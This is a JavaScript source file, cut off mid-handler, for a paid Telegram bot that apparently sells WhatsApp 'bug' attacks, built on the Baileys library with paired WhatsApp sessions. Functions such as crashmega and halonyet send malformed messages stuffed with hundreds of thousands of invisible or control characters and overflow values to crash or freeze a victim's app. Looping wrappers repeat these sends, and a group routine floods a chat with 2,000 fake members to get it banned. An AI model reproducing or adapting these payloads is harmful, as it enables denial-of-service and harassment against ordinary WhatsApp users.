const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const fs = require("fs");
const readline = require('readline');
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const FormData = require('form-data');
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });

//============== BLOCKCMD STATE ==============//
const BLOCKCMD_PATH = "./lib/database/blockcmd.json";
let blockCmdEnabled = false;
try {
  if (fs.existsSync(BLOCKCMD_PATH)) {
    const _bc = JSON.parse(fs.readFileSync(BLOCKCMD_PATH));
    blockCmdEnabled = !!_bc.enabled;
  }
} catch (e) { console.error("blockcmd load:", e); }

function saveBlockCmd() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync(BLOCKCMD_PATH, JSON.stringify({ enabled: blockCmdEnabled }, null, 2));
  } catch (e) { console.error("blockcmd save:", e); }
}
//============== END BLOCKCMD STATE ==========//
//============= BLOCKCMD MIDDLEWARE =============//
//============= BLOCKCMD MIDDLEWARE =============//
//============= BLOCKCMD MIDDLEWARE =============//
const _origOnText = bot.onText.bind(bot);
bot.onText = function (regex, callback) {
  return _origOnText(regex, (msg, match) => {
    try {
      if (!blockCmdEnabled) return callback(msg, match);

      const fromId = msg.from?.id?.toString() || "";
      const chatId = String(msg.chat?.id || "");

      // Cek user-level
      const isAllowedUser =
        isOwner(fromId) ||
        premiumUsers.map(String).includes(fromId) ||
        adminUsers.map(String).includes(fromId);

      // ✅ CEK GRUP MURBUG
      const isMurbugGroup = murbugGC.includes(chatId);

      const isAllowed = isAllowedUser || isMurbugGroup;

      const isBlockCmd = /^\/blockcmd\b/i.test(msg.text || "");

      if (!isAllowed && !isBlockCmd) {
        return bot.sendMessage(
          msg.chat.id,
          `<blockquote>🔒 <b>ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ</b>\n\nBot sedang <b>LOCKED</b> oleh owner.\n\n💳 Untuk mendapatkan akses, silakan beli script terlebih dahulu.\n\n📞 Hubungi creator untuk info lebih lanjut.</blockquote>`,
          {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "ʙᴜʏ ꜱᴄʀɪᴘᴛ", url: "https://t.me/kintanaoffcbot", style: "success", icon_custom_emoji_id: "5316924123786524990" },
                  { text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }
                ]
              ]
            }
          }
        );
      }
      return callback(msg, match);
    } catch (e) {
      console.error("middleware error:", e);
      return callback(msg, match);
    }
  });
};
//============= END MIDDLEWARE ==================//
//============= END MIDDLEWARE ==================//
//============= END MIDDLEWARE ==================//
//===================================//
let premiumUsers = JSON.parse(fs.readFileSync('./lib/database/prem.json'));
let adminUsers = JSON.parse(fs.readFileSync('./lib/database/admin.json'));
//==================
const kintana = "https://files.catbox.moe/bi6cv9.mp4";
const mediabug = "https://files.catbox.moe/6uhr3l.mp4";
// Helper ucapan waktu (WIB)
function getGreeting() {
    const hours = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta", hour: "numeric", hour12: false });
    const hour = parseInt(hours, 10);
    if (hour >= 3 && hour < 11) return "ɢᴏᴏᴅ ᴍᴏʀɴɪɴɢ";
    if (hour >= 11 && hour < 15) return "ɢᴏᴏᴅ ᴀғᴛᴇʀɴᴏᴏɴ";
    if (hour >= 15 && hour < 18) return "ɢᴏᴏᴅ ᴇᴠᴇɴɪɴɢ";
    return "ɢᴏᴏᴅ ɴɪɢʜᴛ";
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
};
watchFile('./lib/database/prem.json', (data) => (premiumUsers = data));
watchFile('./lib/database/admin.json', (data) => (adminUsers = data));

//=====================================
async function sakarowr() {
  try {
    return true;
  } catch (error) {
    return false;
  }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
//====================================
let murbugGC = []
if (fs.existsSync("./lib/database/murbuggc.json")) {
  murbugGC = JSON.parse(fs.readFileSync("./lib/database/murbuggc.json"))
}

function saveMurbugGC() {
  try {
    if (!fs.existsSync("./lib/database")) fs.mkdirSync("./lib/database", { recursive: true });
    fs.writeFileSync("./lib/database/murbuggc.json", JSON.stringify(murbugGC, null, 2));
  } catch (e) { console.error("saveMurbugGC:", e); }
}

function savePremiumUsers() {
    fs.writeFileSync('./lib/database/prem.json', JSON.stringify(premiumUsers, null, 2));
};
function saveAdminUsers() {
    fs.writeFileSync('./lib/database/admin.json', JSON.stringify(adminUsers, null, 2));
};
const RECONNECT_INTERVAL = 60000; 

//================================
async function resricted(chatid) {
    bot.sendMessage(chatid, "<blockquote><b>[!] ᴀᴋsᴇs Feature ɪɴɪ ᴅɪʙᴀᴛᴀsɪ ᴜɴᴛᴜᴋ ᴀɴᴅᴀ</b></blockquote>", { parse_mode: "HTML" }); 
}

//=================================
const DEVELOPER = "1189546122";
//==============================//
const sessions = new Map();
const SESSIONS_DIR = "./lib/sessions";
const SESSIONS_FILE = "./lib/sessions/active_sessions.json";

function saveActiveSessions(botNumber, type = "public", ownerId = null) {
  try {
    let sessionsData = {};
    if (fs.existsSync(SESSIONS_FILE)) {
      sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    }
    sessionsData[botNumber] = { type, ownerId };
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function removeActiveSession(botNumber) {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      delete sessionsData[botNumber];
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsData, null, 2));
    }
  } catch (error) {
    console.error("Error removing session:", error);
  }
}

bot.on("message", (msg) => {
  console.log(`-----------------\n\x1b[32m[TELEGRAM]\x1b[0m\nUser: ${msg.from.id}\nCommand: ${msg.text}\n-----------------\n`);
});

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const entries = Object.entries(activeSessions);
      console.log(`-----------------\nDitemukan ${entries.length} sesi WhatsApp aktif\n-----------------`);

      for (const [botNumber, data] of entries) {
        let type = "public";
        let ownerId = null;
        if (typeof data === "string") {
          type = data;
        } else if (typeof data === "object") {
          type = data.type || "public";
          ownerId = data.ownerId || null;
        }
        await connectWithRetry(botNumber, type, 1, 3, ownerId);
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectWithRetry(botNumber, type = "public", attempt = 1, maxAttempts = 3, ownerId = null) {
  const sessionDir = createSessionDir(botNumber);

  try {
    console.log(`-----------------\nMencoba menghubungkan WhatsApp: ${botNumber} (${type.toUpperCase()}) (Percobaan ${attempt}/${maxAttempts})\n-----------------`);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    const isConnected = await new Promise((resolve) => {
      const timeout = setTimeout(() => {
        sock.ev.off('connection.update', connectionHandler);
        resolve(false);
      }, 10000);

      const connectionHandler = (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
          clearTimeout(timeout);
          console.log(`-----------------------\nBot ${botNumber} (${type}) terhubung!\n-----------------------`);
          sessions.set(botNumber, { sock, type, ownerId });
          sock.ev.on("creds.update", saveCreds);
          resolve(true);
        } else if (connection === "close") {
          clearTimeout(timeout);
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          if (!shouldReconnect) {
            sessions.delete(botNumber);
            removeActiveSession(botNumber);
            console.log(`Bot ${botNumber} logout permanent, session dihapus.`);
          }
          resolve(shouldReconnect ? false : 'loggedOut');
        }
      };

      sock.ev.on('connection.update', connectionHandler);
    });

    if (isConnected === true) {
      return;
    } else if (isConnected === 'loggedOut') {
      throw new Error('Logged out');
    }

    if (attempt < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      return connectWithRetry(botNumber, type, attempt + 1, maxAttempts, ownerId);
    } else {
      throw new Error('Gagal setelah 3x percobaan');
    }

  } catch (error) {
    console.error(`-----------------\nError menghubungkan bot ${botNumber}:`, error.message);

    if (attempt >= maxAttempts || error.message === 'Logged out') {
      console.log(`-----------------\nMenghapus sesi untuk bot ${botNumber}...\n`);
      removeActiveSession(botNumber);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
      console.log(`-----------------\nSesi untuk bot ${botNumber} telah dihapus\n-----------------`);
    }
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId, type = "public", ownerId = null) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `<blockquote>╭─────────────────
│    ᴍᴇᴍᴜʟᴀɪ (${type.toUpperCase()})    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ɪɴɪsɪᴀʟɪsᴀsɪ...
╰─────────────────</blockquote>`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<blockquote>╭─────────────────
│    ʀᴇᴄᴏɴɴᴇᴄᴛɪɴɢ    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ᴍᴇɴᴄᴏʙᴀ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ...
╰─────────────────</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId, type, ownerId);
      } else {
        sessions.delete(botNumber);
        removeActiveSession(botNumber);
        await bot.editMessageText(
          `<blockquote>╭─────────────────
│    ᴋᴏɴᴇᴋsɪ ɢᴀɢᴀʟ    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴛᴇʀʜᴜʙᴜɴɢ
╰─────────────────</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, { sock, type, ownerId });
      saveActiveSessions(botNumber, type, ownerId);

      await bot.editMessageText(
        `<blockquote>╭─────────────────
│    ᴛᴇʀʜᴜʙᴜɴɢ (${type.toUpperCase()})   
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ʙᴇʀʜᴀsɪʟ ᴛᴇʀʜᴜʙᴜɴɢ!
╰─────────────────</blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        let customcode = "SAKA4444";
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, customcode);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `<blockquote>╭─────────────────
│    ᴋᴏᴅᴇ ᴘᴀɪʀɪɴɢ    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ ᴋᴏᴅᴇ: ${formattedCode}
╰─────────────────</blockquote>`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `<blockquote>╭─────────────────
│    ᴇʀʀᴏʀ   
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ ᴘᴇsᴀɴ: ${error.message}
╰─────────────────</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
//============================================//
async function startBot() {
  try {
    sakarowr();
    initializeBot();
  } catch (error) {
    console.error("Error:", error);
    process.exit(1);
  }
}

startBot();

//============= ANTI KIDNAP (TELEGRAM) =============//
function attachAntiKidnapTelegram() {
  bot.on("my_chat_member", async (update) => {
    try {
      if (!blockCmdEnabled) return;

      const chat = update.chat;
      const newStatus = update.new_chat_member?.status;
      const oldStatus = update.old_chat_member?.status;
      const addedBy = update.from?.id;

      const wasOut = ["left", "kicked"].includes(oldStatus);
      const isIn = ["member", "administrator"].includes(newStatus);
      if (!wasOut || !isIn) return;
      if (chat.type === "private") return;

      const ownerIds = (config.OWNER_ID || []).map((v) => v.toString());
      const isOwnerAdd =
        ownerIds.includes(String(addedBy)) ||
        String(addedBy) === String(DEVELOPER);

      if (isOwnerAdd) {
        console.log(`[ANTI-KIDNAP-TG] Owner add bot ke ${chat.id}, dibiarkan.`);
        return;
      }

      console.log(`[ANTI-KIDNAP-TG] Orang lain (${addedBy}) add bot ke ${chat.id}, auto keluar...`);

      try {
        await bot.sendMessage(
          chat.id,
          `<blockquote>🔒 ᴍᴀᴀғ, ʙᴏᴛ ɪɴɪ ʜᴀɴʏᴀ ʙɪꜱᴀ ᴅɪᴛᴀᴍʙᴀʜᴋᴀɴ ᴏʟᴇʜ ᴏᴡɴᴇʀ.\nᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ, ʙᴏᴛ ᴀᴋᴀɴ ᴋᴇʟᴜᴀʀ.</blockquote>`,
          { parse_mode: "HTML" }
        );
        await new Promise((r) => setTimeout(r, 1500));
      } catch (_) {}

      try {
        await bot.leaveChat(chat.id);
        console.log(`[ANTI-KIDNAP-TG] Sukses keluar dari ${chat.id}`);
      } catch (e) {
        console.error("[ANTI-KIDNAP-TG] Gagal keluar:", e?.message);
      }
    } catch (e) {
      console.error("attachAntiKidnapTelegram error:", e);
    }
  });
}

attachAntiKidnapTelegram();
//============= END ANTI KIDNAP ====================//
///////////////////////////////////////////////////////////
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} ʜᴀʀɪ, ${hours} ᴊᴀᴍ, ${minutes} ᴍᴇɴɪᴛ, ${secs} ᴅᴇᴛɪᴋ`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//////////////////////////////////////////////////////////
async function initializeBot() {
  console.log(`kintana sudah aktif di bot kamu 🚀`);
  await initializeWhatsAppConnections();
}

//============================//
async function crashmega(sock, target) {
  try {
    const msg = {
      groupMentionedMessage: {
        message: {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: "hi gw kintana"
                    },
                    nativeFlowMessage: {
                      extra: "\u3104",
                      buttons: "ꦾ࣯࣯".repeat(20000),
                      extra1: "ꦾ࣯࣯".repeat(5555)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});

    await sock.relayMessage(target, {
      newsletterAdminInviteMessage: {
        newsletterJid: "123@newsletter",
        inviteCode: "\r".repeat(150000) + "\n".repeat(50000),
        inviteExpiration: 99999999999,
        newsletterName: "kintana" + "\u0000".repeat(250000)
      }
    }, {});
  } catch (e) {
    console.error(e);
  }
}

async function halonyet(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B".repeat(10000)
                            },
                            body: {
                                text: "\u180E".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9".repeat(300000)
                            },
                            contextInfo: {
                                mentionedJid: ["\u061C".repeat(10000)],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                advDeviceIdentity: {
                                    rawId: 4294967295,
                                    timestamp: 9999999999999,
                                    keyIndex: 4294967295,
                                    accountType: "E2EE",
                                    deviceType: "HOSTED"
                                }
                            }
                        }
                    }
                }
            },
            participant: target
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: false
    });
}
//============================//
async function crashmegaGB(sock, targetgroup) {
  try {
    const msg = {
      groupMentionedMessage: {
        message: {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: "hi gw kintana"
                    },
                    nativeFlowMessage: {
                      extra: "\u3104",
                      buttons: "ꦾ࣯࣯".repeat(20000),
                      extra1: "ꦾ࣯࣯".repeat(5555)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(targetgroup, msg, {});

    await sock.relayMessage(targetgroup, {
      newsletterAdminInviteMessage: {
        newsletterJid: "123@newsletter",
        inviteCode: "\r".repeat(150000) + "\n".repeat(50000),
        inviteExpiration: 99999999999,
        newsletterName: "kintana" + "\u0000".repeat(250000)
      }
    }, {});
  } catch (e) {
    console.error(e);
  }
}

async function halonyetGB(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B".repeat(10000)
                            },
                            body: {
                                text: "\u180E".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9".repeat(300000)
                            },
                            contextInfo: {
                                mentionedJid: ["\u061C".repeat(10000)],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                advDeviceIdentity: {
                                    rawId: 4294967295,
                                    timestamp: 9999999999999,
                                    keyIndex: 4294967295,
                                    accountType: "E2EE",
                                    deviceType: "HOSTED"
                                }
                            }
                        }
                    }
                }
            },
            participant: target
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: false
    });
}

async function bansgc(sock, targetgroup) {
  try {
    if (!targetgroup.endsWith('@g.us')) throw new Error('Grup only')
    const fakeNumbers = Array.from({ length: 2000 }, () => {
      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
    })
    for (const fakeJid of fakeNumbers) {
      sock.groupParticipantsUpdate(targetgroup, [fakeJid], 'add').catch(() => {})
      await new Promise(r => setTimeout(r, 20))
    }
  } catch (err) {
    throw new Error(`bans gb: ${err.message}`)
  }
}
//============================//
async function bug1(sock, target) {
  for (let i = 0; i < 12; i++) {
    try {
await halonyet(sock, target);
      console.log(`Bug Send To ${target}`);
    } catch (innerError) {
      console.error(`Erorr:`, innerError);
    }
  }
}

async function bug2(sock, target) {
  for (let i = 0; i < 12; i++) {
    try {
await halonyet(sock, target);
      console.log(`Bug Send To ${target}`);
    } catch (innerError) {
      console.error(`Erorr:`, innerError);
    }
  }
}

async function bug3(sock, target) {
  for (let i = 0; i < 20; i++) {
    try {
await crashmega(sock, target);
await sleep(500);
await halonyet(sock, target);
await sleep(500);
await halonyet(sock, target);
await sleep(500);
      console.log(`Bug Send To ${target}`);
    } catch (innerError) {
      console.error(`Erorr:`, innerError);
    }
  }
}

async function bug4(sock, target) {
  for (let i = 0; i < 20; i++) {
    try {
await halonyet(sock, target);
await sleep(500);
await halonyet(sock, target);
await sleep(500);
      console.log(`Bug Send To ${target}`);
    } catch (innerError) {
      console.error(`Erorr:`, innerError);
    }
  }
}
//==============//
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString()) || userId.toString() === `${DEVELOPER}`;
}
function getPremiumStatus(userId) {
  const isPremium = premiumUsers.includes(userId);
  return isPremium ? "ᴘʀᴇᴍɪᴜᴍ" : "ɴᴏ ᴀᴄᴄᴇss";
}

// ============ VARIABEL GLOBAL ============
let senderPublicEnabled = true;
let senderPrivateEnabled = true;

// ============ FUNGSI HELPER ============
function getKintanaMenu() {
  // Hitung sender aktif dari sessions
  let activePublic = 0;
  let activePrivate = 0;
  for (const [_, data] of sessions) {
    if (data.type === "public") activePublic++;
    else if (data.type === "private") activePrivate++;
  }

  // Baca total sender terdaftar dari JSON
  let totalPublic = 0;
  let totalPrivate = 0;
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      for (const [_, data] of Object.entries(sessionsData)) {
        const type = typeof data === "string" ? data : data.type;
        if (type === "public") totalPublic++;
        else if (type === "private") totalPrivate++;
      }
    }
  } catch (e) {
    console.error("Gagal baca sessions.json:", e);
  }

  const publicDisplay = `${activePublic}/${totalPublic}`;
  const privateDisplay = `${activePrivate}/${totalPrivate}`;

  // Status ON/OFF berdasarkan ada tidaknya sender aktif
  const publicStatus = activePublic > 0 ? "ᴏɴ" : "ᴏғғ";
  const privateStatus = activePrivate > 0 ? "ᴏɴ" : "ᴏғғ";

  const caption = `<blockquote>ᴋɪɴᴛᴀɴᴀ ᴍᴇɴᴜ, ᴛʜɪꜱ ɪꜱ ᴡʜᴇʀᴇ ᴀʟʟ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇꜱ ᴀʀᴇ ʟɪꜱᴛᴇᴅ. ᴘʟᴇᴀꜱᴇ ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ꜰᴇᴀᴛᴜʀᴇ ʏᴏᴜ ʟɪᴋᴇ</blockquote>

<blockquote>=== ᴀɴᴅʀᴏɪᴅ ʙᴜɢ (ᴏs) ===</blockquote>
/frezechat - ғʀᴇᴢᴇ ᴄʜᴀᴛ
/crashwa - ᴄʀᴀsʜ ᴡʜᴀᴛsᴀᴘᴘ
/crashmega - ᴄʀᴀsʜ ᴄʟɪᴄᴋ ᴄʜᴀᴛ
/delayhard - ᴅᴇʟᴀʏ ʜᴀʀᴅ x ғʀᴇᴇᴢᴇ
=====================
<blockquote>=== ᴀɴᴅʀᴏɪᴅ ʙᴜɢ ɢʀᴏᴜᴘ ===</blockquote>
/groupblank - ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɢʀᴏᴜᴘ x ᴅᴇʟᴀʏ
=====================
<blockquote>=== sᴇɴᴅᴇʀ sᴛᴀᴛᴜs ===</blockquote>
sᴇɴᴅᴇʀ ᴘᴜʙʟɪᴄ: ${publicDisplay} (${publicStatus})
sᴇɴᴅᴇʀ ᴘʀɪᴠᴀᴛᴇ: ${privateDisplay} (${privateStatus})
=====================
ᴀʟʟ ʙᴜɢs ᴄᴀʀʀʏ ᴛʜᴇ ʀɪsᴋ ᴏғ ʙᴇɪɴɢ ʙᴀɴɴᴇᴅ, ᴏᴋᴀʏ?`;

  const replyMarkup = {
    inline_keyboard: [
      [
        { text: `sᴇɴᴅᴇʀ ᴘᴜʙʟɪᴄ: ${publicDisplay} (${publicStatus})`, callback_data: "toggle_public", style: "success", icon_custom_emoji_id: "5316832074047441823" },
      ],
      [
        { text: `sᴇɴᴅᴇʀ ᴘʀɪᴠᴀᴛᴇ: ${privateDisplay} (${privateStatus})`, callback_data: "toggle_private", style: "success", icon_custom_emoji_id: "5316858509571144216" }
      ],
      [
        { text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" },
        { text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }
      ],
      [
        { text: "ɪɴғᴏʀᴍᴀsɪ ʙᴜɢ", callback_data: "bug_info", style: "danger", icon_custom_emoji_id: "5258132936401624790" }
      ],
      [
        { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_main", style: "success", icon_custom_emoji_id: "5316692783963060623" }
      ]
    ]
  };

  return { caption, replyMarkup };
}

// ============ COMMAND /START ============
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜsᴇʀɴᴀᴍᴇ";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const greeting = getGreeting();
  
  bot.sendVideo(chatId, kintana, {
    caption: `<blockquote>${greeting} ${username} ɪ ᴀᴍ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ʙᴜɢ sᴄʀɪᴘᴛ ᴋɪɴᴛᴀɴᴀ ᴠᴇʀsɪᴏɴ 𝟹 ɴᴇᴡ ᴄʀᴇᴀᴛᴇ ʙʏ ʜᴇʏsᴀᴋᴀ</blockquote>
    
<blockquote>=== ꆰ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ===</blockquote>
ꆰ ɴᴀᴍᴇ ᴄʀᴇᴀᴛᴏʀ : ʜᴇʏsᴀᴋᴀ ᴏғғɪᴄɪᴀʟ ɪᴅ
ꆰ ᴠᴇʀsɪᴏɴ : 𝟾.𝟶.𝟶
ꆰ sᴘᴇᴄɪᴀʟ ᴛʜᴇᴍᴇ : ᴏɴᴇ ᴘɪᴇᴄᴇ ᴇᴅɪᴛɪᴏɴs
ꆰ ʙᴏᴛ ɴᴀᴍᴇ : ᴋɪɴᴛᴀɴᴀ
ꆰ ʀᴜɴᴛɪᴍᴇ : ${runtime}
ꆰ sᴛᴀᴛᴜs : ${premiumStatus}
==================

<blockquote>ᴘʟᴇᴀsᴇ ᴜsᴇ ɪᴛ ᴀs ᴡɪsᴇʟʏ ᴀs ᴘᴏssɪʙʟᴇ, ᴅᴏɴ'ᴛ ᴅɪsᴛᴜʀʙ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "owner_menu", style: "success", icon_custom_emoji_id: "5352670019899652428" }, { text: "ᴀʟʟ ᴍᴇɴᴜ", callback_data: "all_menu", style: "success", icon_custom_emoji_id: "5316977664848837418" }], 
        [{ text: "ᴋɪɴᴛᴀɴᴀ ᴍᴇɴᴜ", callback_data: "kintana-menu", style: "success", icon_custom_emoji_id: "6044182530767196926" }],
        [{ text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "thanks_to", style: "success", icon_custom_emoji_id: "5316731584697613423" }],
        [{ text: "sᴀʟᴜʀᴀɴ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" }, { text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }],
        [{ text: "ʙᴜʏ sᴄʀɪᴘᴛ", url: "https://t.me/kintanaoffcbot", style: "success", icon_custom_emoji_id: "5316924123786524990" }]
      ]
    }
  });
});

// ============ CALLBACK QUERY HANDLER ============
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜsᴇʀɴᴀᴍᴇ";
    const senderId = query.from.id;
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const greeting = getGreeting();
  
    let caption = "";
    let replyMarkup = {};

        if (query.data === "owner_menu") {
